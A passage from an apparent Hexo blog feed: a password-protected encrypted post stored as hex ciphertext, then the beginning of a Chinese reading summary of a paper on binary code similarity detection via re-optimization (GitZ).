0ce47cd36217b34a9edda77349bbe51db56e1d336e35f4e298b098ecdac3a87159f422b5a8aad9a11bf8d9256243036e2649c4b9401996c48958421b00d128ab6cf1a7c970a105f1d31ec063f226ac1d869902269bdd68557ec7aff11b6426f87f2f1068535d3042ffe7607fb43b6d5ff8c67244f6249ab25192c0da2588b5064b0c183cd8129e7208410e801b4508520e864336c14126621405a10e8c5b5e65208b623e1f8f365c3240612de9601fddaa5e9dc38a76afd8630bf3c6f8540e17d67869ea380238a2f6a0be4923493c531ff0524e4da863b894ead545aca6f424267d651fbcd90aadf2f175ac9c662e2e1a9463c8f1b2c9a9eac2a78c34f061e398cbeea2c7402a106d4baf8dd634a28ef14b66eae838e1d448f36ae360bc2655cb75bcb9dde2f96e617b7c90e69bb9c2f6e96ba6e55346625b8b5132e4e77c7fd03eb9c43f204cb5bdbc1e02c8de7d30b982cc720a88bdf1a3412a80d41853564431587749de7318870e4eb65d774d8c407f4421083b3c5505873ce5c0c4df7dc8b6df11df84b54146dde6c007dd7bcec345ccd87eaa966c61b7a39012149de5b10a4915b9380919d1d907f2240f833f9a2a1d11bd57dd4479e3ff0173c8e725e24825097d78ec78ae765ef34e3320d888dcf43d42a25f4a764a173dfd63fe3a6ceeba131d394befce2e448151582a1f4f72e78a010589c7b59eecb2794248f8097d4399964b4b0dfaba17162788eabd06b71e25fc34180062a4daf75aec478ae6fd9b2f28eea4a9b3170fa80df05a9091c544c9f9148dbd943036c5331cf50a21b012b45096ccc95ce848dc04b4ea97b7e43dbdf3880ed154e04a55415be900d40a66bc23509616f9df7789f24f24dfb8ef9bc9e4a745fd4510ad37f3a345bbcbf2f7c419c93c17c6c5a1d473dcafc26383132aac659556be5312870b2209854fe5bc525e8737b4c36286b42ce6e88df9bca1a2a99e47a3083f2bc716d993ad9864c5ed5e306144c9e576dbf7a8ec869c6f8e500f516e41abcbbd4bcd8533ce757156ddf06e3cd07b55b988022cc7addb1ac8ac8ff7a35bb98eaf40f96385ebdf898583f3f14bb52e8b08ef853942dc984c216efcc320d86acaf5bcc45f77e4776adb9c12486410bb518b4fb863efce52269241464f93337ef0109daf3cab5fb5a5e9cc799cec634669ea086f0c2890fc67eacc43b7ef5a0230bef40d2c3965297ea4ae5d2ace5b39616af2506b7057ad45cc0cba943696df0a7cb51d774a83069b9900d9f87a58dd6f22d8005a61e577daea0c480876d6461042a59835aadb5822fa27502f439085545c21e5d330d4b022ad2aaa323c5ee6161e9f9f4d52db86f8d32da8ef57b37d763afb140ceb9840be95c60a19d0f101639989410ce3da9253125de17e980d000e3b842c0883294a100d335ff47a5795cc2ec8b9765360f681c64e7762c221f049162b6b3b0690faaf42bfd6842727d38a45eac4333f5c3740b2fa27bccfcbe583aeb41ad0949d3f3251bd54825d74bb75e502f1171288568c0e2a44c046efa3f5f84b9076c0833cd1b70ffae31d71b558426ab884f916471d0d1f272e9d71b37973e20bff7f7da890bb6a03d3b43223bf6587f0269cd4d4742b95f1a8396d05120e5fab2766212afd8fa969c00abd5b10357d3d58862f0b79fbe663f19ca10a3e8283205ab4a771fce64e529b25c9c90cf2d910295189130d2179467a7aa7e4af01b6ba1f6873bc5f7cd41253b31a56123d63f7984d1b68b27689d9f57c59c5dd7773291d8775276c265f074c9072e554e93d9af8d90bf5485e4bb68825d6c78ff66c40fcf1f4945f7e0c52bb547b2d517d7651d0bd7fe3fd8e8a283e98c45a57868c92c657f73c76c9594b98ba8da6898b3cac3dcb11e23a543514c2fb474ec4ff73b19f41ea9ebd8ef66c5c858655a631ced4f7da69cf44ccfd4f7be82b2ab543fc68c312c64ed0f44a4f52baca4a548e5ded24554d403d0bbb0c42ba3a62cd35c315fb9b1702a3ac12e6046e2fcc2cea10d40bde0d65acc6fb6ccbaee09329ff5fe5b6cc562de34bc19264f92af2dacf9acf7502b2df6e770d45f84c3fec31010f3856ea32674dc7969a908e85dab0eb724b250b8d9543e79a3d5e81bccc960af6027cacc4061a3395ea6541a0027a29e1329b906a94b02e972734c6f3ab337f5ba72e1bb22d29a2375692f92fe7c89aa3f2dbad3c07dc4cec89855239af3c367e2f1787c3cdc2c86d438a8ae916950ee8e77ffc311a92d77ade13900607fcbcf939455cd89fa5ba32da8b4cfe5d21a408fe53bd747a7c6160d05f617d30554a09a5ee91537039b20cdafb8bb8fcb1cfd879e669ac0386d1da071faac594420a252d3c14edb4ac8aa237e8554a289987b9bac15c3b4a197102e4dd897fa1ba028d834da4ea5916a21e0e307eeb26da0f92d316fbafd3d18ee4557deb70ed1218edd40a29a7c9f182dde88316ef8e75cdeb636b6462f86f09af2d7da1b720f6e5524a39e1d3584daf4ff6d9c98348d65ec884a64ae103eb70d805e342efe97b506af09f7bf5cf0189c264a2a8973793606cdaee9af3760d3db6be9b00483fee72809b87a1aad4857df09a4538e1bd6618822dc14d0376b1a798ecdc4a4520480392e1c55eed9b0752d7dd410d821d480ba54f830ebca6af306f5dfa118cec9510a0248fc0bc5c8d8cf75e5d9c35b0ba0b59d255b38c98a9f201ab4f7456ce612aa7926a3e765f7b4b1ad077e1b9464cdb34c5401aeeb781ce7fe0c19ff0a33e5b349c2c5e2b2a3555dc85b198bbb0ebaf03d1649be62aa28b08a0d4a07f9c5f98c8d2e5f9e3729e78c9f51c883a5007979233d22cdfb91683f7bfcf5b3f250b4fa8e86417868d8fc21c8931d472cf52d9065e8ccd6f2c185c3734c744a47df4bd2f2ba0e4f67340153738795b40409764cb3be0fd44e003ad0a32425d454f2e5627b6878621a239b25cef695367a1337096d1d2f025dac0145248476c4d4a8b96ceb7bbc670531c001b66d9b5001ef0015ba40f7d0cd9fd91829861784b65c852619409fa23c0a5179195ac36e8eaeb9c020d18478c62bc94e895d5e0c0808b501d5478445b573cb88795d2c4861053bd6ff5c00d44bf4cc1e247a7669cc7f6b5af287f98592720c0fc362a88d29201405f9bd43a32601838ef53ddda92da933809ed50c83368bf33de7231a9faddafe25a341979673720231fdb99e276ebe7eae9ed98ed6e7844c4aeddf68872a5155b1705c912e91c5dc1839aa5085fec580f2fe03e21c0cb222167214582840eb30707e17da28b6c382398de5c23951e14e2512f81b748bbded5102252dab141183ea739011b614f72c6efc69c64958b5927390cb2c2f88c74570722e3f10ef0975bf04feb2671852785a19f2e3363b1476fc349bff48e75c5660b38efc776c0bb2882e3f21da862a33ab111c8bbb2cc67db1e86a5e3dcca81e95b0ce20bdb712f62509c750452668a3b9165d462b7ae91ac55c6dfb763dd2c3fa7af25cf0749140ba9e15b8280c89884918c3550d1d862b3d18758b1cf29f47d86857755563ae0cee0b04951f03d9b8854c26b89f9272c0f9cae46dd1f8e125bf77eb5c5d8e39bcd04c7aeb533d174cadece189d0e391bcbe697167b829893a31403ca2f4eae86ff5af1bd5b0aa146bf5b799b838f6f62b65801b0cca7d2dd779390a4d4f1f4bb145c89ada5dd41a73c9ef14b017810876b43619c054083e78e0cc523113cfaebe2f0ca810e3fbd9dc256d292d5097d0365ae5b893d0aa01cab24964a5b3a4bc78009ac1bee9a643d00aa509da242f7d1f224a9c0090d7dffffc2daf15e9e1f41b960ec582d34451d6a7c670ab3b75713f64f27bd18f1c55fdd980874abad57ddcd4f16fad7a68784713e4390907a6296ec794d23d6206aa96d5e9935f9566f140b9a07bbc7d3e61f7540b2af8ad98fd0f072245f8aed6f4a6978a440d469db3dbd79e7dc4760fb7738be46e77a1f1b3efe6a8e7f98fba55f898c7b940254d0882b3369334ec3639747f5959af7f79da134adcb22f6301a102007f88454e876de69f4c6ccda1860d0d001d2ad8745c80b9c5ce8d847b1735c2993e8bf90fbfe4a0ad606574c79c752f69eca79828010f8768193ef505548cfc34e307a6658faa9763b2ccb6c740e84fed709d635bd0d548d50a683983be521a2b7cf5325f18656b9ba2420cdf4839c67faeb486baf52f866e93dd1c96bd0b9cdb19ccb585122c0666551f1dc8637de7afaaa2b8e90434ce8504f83e07c50957fd0912387c75d6e1d364d9bf1381a4998575e6e3cd5e0f75e8fbd1e565f6ed2b322052ebb427ca84408f331ab81f4d676fb964f03a191ee57e72d3306f6b308ee79cc840d0f9e7cfc98f14e2e1943cc365081564448e21ee65c234c3367c5cbb965c3aa9404e79731e380a9d4aec8f39b0ea7655e02184e428879e7c2e8a1460a3d23eb28ec40edd8dc275bfc3464960b212a21302af0c46ba54317e7f4f41e13f837983086582a1174b9f758fd22fd11f9f1c971c42f74105aa0d706099bcf655d1f8093b04f82ddb80103d39c163b64d75c5d09e1d00005e9badd9e6de11f9a23dbc3bcf96aca5f3f08f2ca390bf3654a7150b57abbb286608f2fce036f3f48eee28324729b79cb6cfeb453022c6cabe7c6078e0bd52d3937efe84dc8693e7001dcef700b7e816fee71ed7b0d947ba4f499853e90fe08a3e5c5e4e9769207d9c534d7c6ba3517b851ef9c3a452018b9d010067850e739253c719583b7dae52593d1521fc373b86bbf885d8d92ef33ab723db44cb13a0c89d2c7fac455b06eb42ba26d83a7df370aec711edbf4babd9a870ed0492c2683fb8526141e78b560bd936df1a69de086188354a7eb4c3b635adaf8ab7c292155fd4e1dcf037d9773e1c2c4c73172c99ce87be4976d375cf020df803d5b5148097af18db1befacffaa30c8d50e1613d7220ff2bd0d453365528b37587516d3cd0a17e25f9d7720f8293f5f1770333695dc62be0aba644a4a4ad1d35bf01ddbfda11a47fe5710b4d807b9fa6048d0af518be6c480798b3d67910c429d3571bed2ab2c3e3f86d2142106e4b9cae396962aa8c1b1c1594e5fbecb50ab878c02ffc8e963cf1bb31407d8eb7ca749968d59919c66df81d9fe732a9b040060172ef9afe50d989f22306946b39c8a984031b8b271c8d1ab7e17d0534dc261bfada832cb55da45660980e6d4303e80a13149e9b89a18b9e6626221a38b2c996577c7fcd62634f10a24e8b88b0edc4ade366e1cfb443d1c146bd1591f5cfc858a4dce359740b17854e79e83fa607871e4abfc46d4c018ec13dbcca17d5071cec479fc5e0e67a032e3ae860170ffb6d32dae72f3b1d34a02c12d5be6576effdcedf53d3b80898de320ff8b7df6bbee212acbce866d13d70b4cdaa5ffeb1e32bc2a6c3e78b3b93f3b8d325148bde83aa85a902c54597d8e9d8f39225eb982b05a97707c7c94c29e6e26b78cc086c034b5c6a804d1dc171267eb2cdec0ae2b8ffdfe47f050b9152b5a72673e46f1cce2f084deec91aed09679a4120ff8dc14f4b6d37e45e2b50d78922620ead7ebec07003ef892b84688cf2dbb5f83c9dbbf1c8c628f648eb62b84649b4e52702c2e912d0f6bfa2055b0cb470d9c9c81fb89b2d36cbd13726c59ab81de8a582d7bc49cc295e7c30178c468c562f827488c75f0080a5a34367368be2d9c3acd823afadb07928e16dfa32673645b41882c2a50399ec05f710a840afe108758e16e67965f68e09f43e679e8795557cdfe3135d33ad456f9338f1db6931f52e88e3cf1a0b4ee6c9ba789ad329003353f7caff4cca129610c65e5c9aa65f6c7a1ac1718cf4e267a72e4fd09aebde140f4d55da590a705929cb46f7e8afea95881812ea3068a08ab17caedea6e04d18fbca6fec114c7bdacbc8faccc3d7a675eff75683323e449c496759cce44b2c19033daa701f1b5a5889adbcf7581b7ac55781e8d90adac7bc587fc0b27fb4e6ceb1aa2477aa21a34b1d8d8f154380bfcdabb80b2953bf7e216bbda05ff02792851a246cab965b708cc5b8f35aa991fb29ac37401b1792178e26e4ff617ebf4e187115c933540d3d1df47ef895548a9892891da7811b3ea5e2da3ef492ef50d4f51133701975a7ae4a50b1f447c280941705e125ab44f939115b625d35aa1fea1c55b2e64a3cf5b09c58717547a74da15613681d44ba045fcd0320d4153990fc118ad6caf3d49cb095efb61aa7ecae1492ae140c358634095323451499f51bbaf149990c1184f1c706131d1a7d5bb2c399e498a18c550e14ce47593a15ea7739dcee2afd80dd7ca6831df1eaff01d722e4cef8728aa6da9320adafbcdd4ffda038632c828af217ac8febf1e0b17acf1d75a40d8e6f13ac8988c98917689b85d62160bb60d45eb9ef5435d11337eaa4adfca0a2498f7a2ed01a9d1d35193568382fa71fda22487e8057526783f1fc35491ca908c4f4b3363ee34210dfff097593cc6d8dc8e36dfc1c046512a1e03f062717d9fc9957c852d60c9d012381e8cbab1b3589e6a107a3f4f32696e9e14a44bdca99e25cdaae20d2951af5a89deffb911ef0e34523f317ead4afedfd92e80b1c1640339df5235e2260c4c645848bc3171fab1f9f83f32efd4a9dd41fe80c2969067ccaebd81f7269db6014561553d8430ff92968f4a6ba47158d6e2b2134832b51ba45538c2ce754b6018b2bfa44e512fc4186e33e8f5bb44d80d251b8e7d3a3b91811fdb7ed7002cb80b3cdc19ed67942a18c07e629008951d77677dbf88b2e6a6ca9d0de1f7baeabd49f8b1ed644be56512a61289d3ab49b2e0be9d6307daf06b372b28efa3cfd841a3a90f6b10ffe9b075baca12a6275a1f9aced486605cf7d289954b68052c9567757e17b2752f273df6006bcf0026e1548a243b6fc05447da4f3c97343ea8e9a4d174c6d4ade2de77eb99261c8194908105ee84c4c8503f55a8f8a552385635375f5dfa254da9be0113ae19a03ee22788cf89ff082c373c761a70181d6119f82bc8fa1246f00001a5f3fa20f77a68e477132bfd62803e31e6edb95b67b58e4f6c9cf277133330c9500f7fc8798e861e71162c5e755213201d5586ec3e09599b0abeb08d47b14a04e310a7aef9241fbbf9bdcf1b130e7ffca63263581b3305fab92497595fab1af225ce189a89a6323ef698792c99421a963864063bb3faa1de6c0187163266781f04259526a20a969a762bd210d7e02082e4eaed9c46393fa11e58848fb0fdf7994ac7258a08947c68fcd077062dfc72e83ced82df8a926c091089a445b65565d18b23b250076c9715c3df41b0f7b6fb6364e7eb8cf52595c51949fb5eb77afd9b8a0194a4fc7c51466510acc0dd2a934396448c840f99535b809060061f92f1d788c39398371f919fa92ce86d8349426d03e007ee028036d318f1a9066333ae4c500db7c16759590d2bbadf947ccd05ad088df5229f93ef04cfd1ccfa71f954e6373bc696b1d5a22f36206e1943a39472d939f461725960d90e85d100eddcc0971bde7650cbb0d70de270177ca4355e2b287a4e26ab371d708e8c1aacefabdc0ee4f12dc8a81bafded136e2cee9402fa5412e3b1939a5dcba6f9caaa98a0f13b852c9c499894cd596db6389cef8186786e145de3d361c039a704074e33165666b72dbe616ed1c9b368f481fa68e46e9eb508a0922b776e1c7ddc697eb61066c2c6aa57b2adce7ce8b49fc021aad45f78f24fa4a03d019747ee6f90a20f8b4b2d3ee84a2088ea77751444d30df4c0f7af8f843ee19c0ce5e9d01938cadfc9bb2f69722e89dd79a8347c419ae20411d4673be96714c5ceddf3e9b3096a508ac3a7a70fc16732f34f94c03059f21ab00efd73fe338c02de3ac782d4c46f6dde20a40b03e0098da9bbaf7a82f0b26b20aefe779669a0b9fef1d923e231f90819558a2e064e474649a29f0056969d946de70f4997d3b71543ceb050e51402f84f470e19a80b4c4f6a5c48d753b7a295ebe4c0b533e25552e5caf54dd450d8afb5e197ca1b06a9d853210ba1799ae1b2aa94b1d7355576818e0c972052442cac92395147ae877a79efd3de5c6a37ed54e39a6fcbb6120bd8ea4777ccc474d8454e2cfc57445fd67b5c2c620d8424d0bf53333da6ad98a681621ec61b23991b0904d17e21a526c49507a27eae1e30c35e92e97e5808b551d977e6c27445865650a646fed6e716956f86ae3d572e0ef246b8153f78bacc71108054373e6f2c7ea17372c410b8ce4bef5ad5e9ca66a1f790444bc58af45bc12b4d9d3cc099b1b679fee8fa695e02c09ad23eb9493161c412a9180fee38393a2606269b40ee0253dc43255368d88efbf09ce06978292d9fea071fca77b13502e63a2215b8b6ea8a50f6c3002e4df985a9ff5749ffd5427f6a68ab45e73d788d34dfc3adb8c3311585b2ab1b898e97c9cd3d35153632c9d6c0c2f007746d6bbac72c3cc1ccbcf5596936616362100ad3c276775c50d1e593d21f0e31dc496e1af9f071f8621131f2c93fcc81bc927a3c9bac0d613ebade1fdeb6e452a3761f92b1b1563bbaf2ec1becb602856a4e71d6d2beaadf51f9339f79843c12e38ef44ef0aa1015ed614914967dde1a01a4daba5c8e1cc4460c6aa5563b2cf36d09d756a50040ae4ea9111271dd9355fbb009dd66f817efc36ba2026c0af8a92b0dc99b7e9edcc9c95e594188c7bbb48637c9983936e47c8243d51d586107c9c692ecf3c050cedb57fb851e77fa4f50ab5500717222ad735ad92bc0ba7e1b2ed01d2dbb6f9e44459d959690a849c38423e1c68badae85ee0b0db8e74c2ef98e4ab9f5bac17b8542d1c9229527def1d6e6b80ba6c5af0a787cf260429a27f4103dba3d6ed5196287d6a214b2ff188a8e822b20fae1d52e633ccde1954ca3e59c1f3e610c4f17bfe3bf03334d0013ac31847760d14ed3481d8c3b7255c252e286158c3585a2fc3cf3edfea0763efa7d177dcf75b12af3055c9f80c3cb3e6c550d130dad2b1b87f660d456facd9f954bcd049fde135bb2106536c93d67d4ca601364755391052329e03c61424cdada25dc4a7a8be8ed4320b3c0c497a3a85ac51cdb55679e32edeca8cd997419b7ed50a7a166c7d35a564409e66e49ea330fa6e6f79dea5d61ab3ca058e69a7a9b8c07517fa0afcaf2ce289b8b1c56971659359c869969384b58d07c0e21265610d3443b90e4a9be15a936911dd01ea16059da93bc6f7e060ce83ac5264c9f0f0d54ea765ca31cfad6e3d24b1b928c5edb92aa424e0b9461b269aa126404f420d1b8026ece00c8b47d26bda6566db8d18dcf7ca6943cc96e49af875917d2e32aabae56bd7992a0bcb3b037e87c56438067f6d2199d992999e2178976ce739c3d82a7086ee4159931fa4d33c84f6f530a75294ee751048c7c157b5bb288b587f4140cdc54c663b78cd51861a5f4fb123d5f14cdab300ad31298c6840427bf6c360aba908c762608d1e7e942b7bc84a9047fda96eabfeb509243871c32faef767cbe7ecac07aed5085994d21d13f54c58466b63c13df7665ffb19ad0419433cd95a74c77606439d3346aaeb9816f25667a4d2e6fcb97d8cf4f3ff4747874948b563d9f770d556f3e9b9ca9f12ae2dfedf9c43f6e4af3d778450838b10ea0c7072bdfb557820ee8cbf020cdc9d27807d5e1474e99f1d71be1a5478ed6744cc4442e5322b40a8cbf1548b6bfb63d03ef0c0afd9e1a39ec9e4ddb112144b06fd4f008cca9b5db195f67d02d68d3fc1f62567fc5248f51dc0c088d9349508a348993dee1a6ea81e6094a423ff79a8250ac4e517485fe53c75cfc4a2a43941afa561727acfb08663684bf9c09df63fb650a920489a65119c19b994be312767591868f70b839dbe5bf68c73699b979b4c59a9504597db907f681e1f6d95cb4d0c034e84c55af4d1af4ff82d2403a86deaea8791bb3d37ef14d8da0322cebfca1876b808d95ec8cc66a620abaec59bfe5287ca4b25eb311dab6a9a34ffad0ebe3244af678f4afdf0bfb478d5e5945efa4d7ca671d85705c7d16e180bc2ab9243be121a94f83dcea133e57668e0cec7ec233ae1f15a7e11e93949a2382bb8e2207111cf2219a736c692ea375e0b9b525085d85590c6bbb65a83dd2b96b5063af5f5c5d5348fc74b865c682b56b98f22049389cbb82f15fafbef783bd27561f665b45af579f19871985e2c1ddf8e2191a608cb7e25425326b711209fd1f2758219a576950e3daf0860d44da550ebb931fd80d805a4dd0572d4059693ba491be63b6d474c67fabca806daaf3e9e85c9f74bca447b9a46cbf81776725d485a14a8111a040907531208a2e341d2d52a0096008a4f7750a246ec6b9d53ccb3bf1775b2bd83b1e3c97422532729c7f19a84f9b70b921641aad276541f9727f0cf8b8d2f887208ddbe46c13e9903947d1b9b0bee4182edc8f220d1a1f9dae89532368cf52ba875d85025966b28e969596734ac05bd2551dfdb2b6c5ab9fa4f97fb8c93e04a24a069f0bcedc8cdbe60bd4c6b8e78965015032fcc3b629a424be3bd9eb85134ef06b7e86495c06f774c291078bff0db65f5dcfdd831a6fbdfe36e6c1ddbffc25524bf50f845677a1374dfcaebffe74f26bc3bba96bd7d683d567b899eb9a0900179344d09f961f89433b0dcde494958a6474b8343d32124830a58b0d864213df53c5202d6c905492488107a2e012fb51d41448eba1d45c6c5f5d9225c7f8c4576ad0d6c0dde5360dc13061cbc0c4dcbd7d0f9d077723bda16baff2ac7f5f120451f3ce408eb7f6d916eaabdef286465610669647b24d0122f20ac175d698eddc9a1a13bc94ff09faa02797e5c3c3aed09d552d3f1cf7c4484a828a38546f4ddcc2be15ad2d653fb065d56af583875ec87557f8e5de2efbebd0887f8cedfb84df834ec3975e9d72e80d439a3463227be6383c01abeca34986b7c4322bba7edbbcca645396eeada3eb6f1c4c5760a6f96ad9741b833c2381fd820d02ee38ee1558c29c97b53eab0f73a3189e4a07918c7daa35fc94b1e584d522429fb2bc9c5e6c7cd3ee8d51069e5af4e9404d39fd5eb34bd185eba55660986288c3ddbe2592e042e46bef6745b70df505c1ca843bbb17f276b8d3e8053858de2d52fb47cc43152b6c3ef46cd9dc93c72e6cc6b535530c3cdd3715b250c1ac392cdb4bf0ef60c67fc95ab9e4d925ac4b2b8217a86e82197f1a84c7d54efbe623ab9696a83b4341eb73f73f019914dc9079cac0881a5b09bd1d6a530992399d67be4b39fb2cd759d49a0021b9d946d0578e052ec6ba99afac5635bf11947374eaf8126065f6224b5c1d7eda7751bbd25721967ac477aa7d298fdb7088707b2fc4a4ae05bc838adc7948a26b90839b4db36437f0bd886ba2c8739d1e199ac0fb82cbe12626dde71da9ad8dc49bdddd48ff96af5c1bcfdaaf1163610da0c7cccb7e4d2f3745d0d5223a727276a07c5c72d9134042d366888d61095ecbe803d8ff7b2cdf896087212ff279f11c9e62988aeac5879d1ed9b7b84fc6e97518d08ae8e6eb3bb072867df870bbdb83012a311c5ab24490d830bc647a610671e8a4bf8978a5ab9a3fd7660979cc59f4e29dcb4705101d4b463c05cfb1f6a48aff683c43cdc1cee290eeaa46276a68d92a1c335be3aef93e22e3203e12707ca74358c8c0734a2ae1943f89640ef4f985f1d16bb756968177cecbef1f0f84687e2913e453358efd0fc8939bdac00b35f7a4e0aa2a34b864f5a4beb6274a4db2915db01be66c6d53e3c5202b2345586cb4c99744bc719ae8e434ed3acde0ca482bddcd2e46831f2018c593d5c99d370898e56c51249710e0d1ff76b4509996217057d2d87840d899d588dfd2efaa2f75292339d48456fe1425a2d5122ffbcab852ce47142ad4f59467fb708d75ca2d89ed7045ef5e4c8f75860c557872e3e2bfffb80cf635fb2c021eb7ecd6bb93165985c07bf7fe25fd187a5c59a7369b00c852c508cc09a87114b8067baa610c091ce94f7f1b73e207ce2f47d251d798ed3b85cc501773e251fe69525998dc4c04bdb113fc2fa9659e780cdf1289cf31eacc9b7c959df1651e48d377eaabfd04d571139850acfb6ec04bbec2f71768a49d3f41a13fdd34b1461faf0bab314c0bf1ce9b657e7d31d3800f84c814b83ac6fb8d0b44756df00b7f24c26fee63094df6284bcc1c3f08965b155aced5432e9171500ac09291531aa309a81fd58c22cf9cec4716ba4d35ea65c15fc5c35001adabd4517ab397dc53b92450452555bba7b2a7d2cb0a1986d9a187796e671a16cff70d488862d984e5f520f95952983aa45b6abd0f793b5c66a3a1f94dfa8b1bfe277e5a5ae7ddb9fd50c705a4a84d3dd1e0828c7139aeccfe2ee9d9a6949cef9b046e8dcc9cd6496769d950a8ae86327c870c4e31096340cac0622f432b599ba5cb68b65d1741f1328a4b9071bea7a6ea67ee25a89c3380f9fc162542f09c0616a29775022533fb25cc7c00a1374ed4fb7a995e8f167def9f71871ae1626cdb07b148d25628e88ce5f0ddac2ba4de52cc64b6b9d17ed7620f75ddd0a6fee1983de51ed5c540f3f74af71b07b6f171071b0a86fe67efa080d32867cdbad7e6ba7310b9965faab0da5715c8050b90901400a10ba7efe54108871ae150573f421c47a167a111837ee8905cac4b96d1dc7061a5b456bb21728d6caf73f3e7ab846d800fd3a81ebbeec015d4d6be41cd6d90151c40e0c2202c51d62feaf2d2332493c7f81ba3b901a70a7bbacdc47b8c8f255e635e268e542358762f2972a3c1eb60eba96a401f62e4c42de95da795a82c596cdd1795434539f02f68406ce0e199d1cc8bb5fe846fbf8c2bf9ce1b246d6714d1d3ecc551ea33557ff5bf4432efb2b993b7f96f1389543ff1db5557c8909a623e31ccc4a20995473da352935a2d1d2417ed76210d8b632f40700c8c2c5ba7df4ff0fa913b4953d8e9a30265dcf2b1b8ed5a63251dc303f45b0ddbc749f1b19cb8436c753e5eb7d24b00cae6ac7dc9d2b9232924215caa54db66a5a130ee973f13b8fc22aab6e12bcea30f4bc4dfdc028066ca40125bf6d295c184b245749ab2a5a8137bd46846c6c965e64857f94670666d8c76b33498654c28339c0fe89620c7dd0ed9d4206005225613217d64e19ce96019e06f18d330c755bb73d9ba68560082d09e35173f9d05790c405a79d6d9e648e6f9537f48880555feb138880cbdb5dabfb5dca6e7dffc693cba1f4f6a22eb7a2597f8da8a757ff15dccf4bdd77c892f1296547e259d40cad4ab9287b3220d7a529b439b7f206e54c310c6103d4bc841017ab3d0d5e21a80d5624bd9a5ade97f3a32d51508dd38d5cee08a13058892d0f4a963578de469c9819665b6a1812cc5c2bd456b1a4f4504755e6183967de06ec7b18c9ba2bf5ebefb7cd6b8fceabe1bdc9c127b18750e78736c6426f9cf23e5eda4f265ca6ad7770a74611241c09a6f1aaf7596aba7fabd4a20fb37840e454683e1e36de09a66de57f85893a798068caf4807807d20528283eb80f390eb10b7e2b8f6c2e4a439fcae2a24d8bb0e7a2a9c45b30bfdaffc858bc8c09c5ec763160620e40e02b88c6df8b7b78a626e68f5af3cb4c20206577d6065d10eba60380d575b99f6f8d32b722c8ed669f8d1ae2846321eeca8445388fd0b995d5e01b45f1f51cdf776f74a9b23c776109978b707ea0cb312e13eb9cf6c05e38e993e6974f87a19f53de082d6cff8ff84ab9d33a5e9ae2bd31b8b330cd49dc7a629ceca553f1b9e9b1f05cd09bb5ce982ddae4832e6e50b191713d9a1518aa268fba7df2d47c7321d3b348d877e0151b3448849a82396cfa706bd354aa5c6901664106a94abe904e6d74487724dbc67e74ec087321c18c20398821ee1e4ea1d539ca737e78be9527182d49b599e37fba0cdeeff91f682650632cb33736e9941024087cde913734fdeb123a1497e613950696bb6cf0a7ad46ec02f743a55b2db8fd659ab93593159f381b5645c4f5b04fe32000b0c3499f7ae47b4d280bf02bc802b2d59f5049db200210a45ff3d818526f460e2144d03ef5291145a3985db3af556ac796eeddddbf82a0ac4022ba905aba7f42fd71686088b517f757d35997b79fb90ec87c80f25d7dbfa734d0c9f7e9cc6b2539606802866c0a167860d4a7e080bf3c8292dc0afcf27e6049ffb2e6d2ef1d892a021497eca899864e325256c407c1e250608d56337dcfbd444a5d9e126ea14ab4e6f677072bd0ab0dd000acf8721809432a150f4cea2d28fd67e9982d4af0979255e017bd7f4267bb11fb6b77df735085dfd57eba6e29553b1574ae62c82f932e028225d3c9c2704862632e9ec374966abaf3d9f7a8cf9107e3b0e39cddcb331d76e8eff8332e75763fd2a633f7c4cb64dd52452b92c9fad769e9aca49388e369ef6774de64075f91e43162922f226dc028d6f93f04de29e406b090569189a6e444adb056fb6f5199d82c09a0cda39690863840f34b9e50c7d01cbc5c50c22b6169816c9b38a1ef0ee96bb04a5b12bd7d69da005bd7595120984bbead9fb4ce94b6b93ccc0fbd8fd72417a1fedce6c6d07f0e756d3beb51de908a5405c95dff814a62b6bded91840e6a71cf4b7c9138bda51ed240269b0869319196932be56ddc2ea52740cfc00de62ada0578bc03ad843df54acab7c29641b13d8ec6c4abef74db6e256179b2c2fd1d84259a3eceda078ff8b0ee82e7a49b7a9fff9273b72d2bc53d1d1d160c3279ca58e9a8a8da7385c576d08d5a7a9253159a8d1e134020031ff4fd730b57362a3ec0c63341c7a99e7ab7d25f4446595a70bd72adbcfbd00c0003468b171f23cc19cafc517cd811652206f2f2c59cd8677bdc0fb76e4caa52dfed699ec0a6915cbcfd1bd329285bdb5f0382535aceb8bfb5a1916098fb464b95c9a4e429ede7bbc7b52d36fa2905ca18250c673490d1a556a79905c1137be7cc83c06123020e201be3c020da18cd91e9bbf</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">NULL</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Fr3v1带你读论文-Similarity of Binaries through re-Optimization</title>
    <url>/4066.html</url>
    <content><![CDATA[<p>在知乎上看到白泽的师傅们读论文的记录，试着把读的论文做了个类似的总结。之后看论文也会选用这种方法，翻译实在太笨比了</p>
<p>这篇是课题组导师给的论文，跟课题相关度极大</p>
<p>数学公式渲染并不是很好</p>
<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU0Nzkz">Fr3v1带你读论文-Similarity of Binaries through re-Optimization - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<span id="more"></span>
<h1>引言</h1>
<p>在对不含符号表等信息的二进制代码检测相似性时的主要难点是建立相似性，例如有时候代码是通过不同编译器、不同优化级别或者针对不同架构编译的。在尽量减少误报的情况下解决这个难题无论是对逆向工程还是定位漏洞代码都至关重要。<br>
作者提出了一个可用于大规模检测且具有较高准确度的技术。其工作原理是将二进制代码过程分解为上下文无关的可比较片段，并将其统一为规范的形式，随后通过简单的比较来找到等价的片段。<br>
结果表明该方案（称为GitZ）能够有效地执行大规模比较，且相似性比较的精度较高，误报率较少。</p>
<h1>目前的技术缺陷</h1>
<ol>
<li>在受限（stripped）二进制文件、跨编译器、跨架构和跨优化选项的场景下效果不好</li>
<li>误报率高</li>
<li>无法应对百万级的大规模比较</li>
<li>在静态分析时需要动态分析进行配合</li>
</ol>
<h1>提出的方法</h1>
<ol>
<li>分割程序片段。将程序分解为strand，即基本块的数据流片段，作为相似性比较的基本单元<strong>strand:A strand is the list of all of the instructions from the basic block that affect the computation of a specific value.</strong></li>
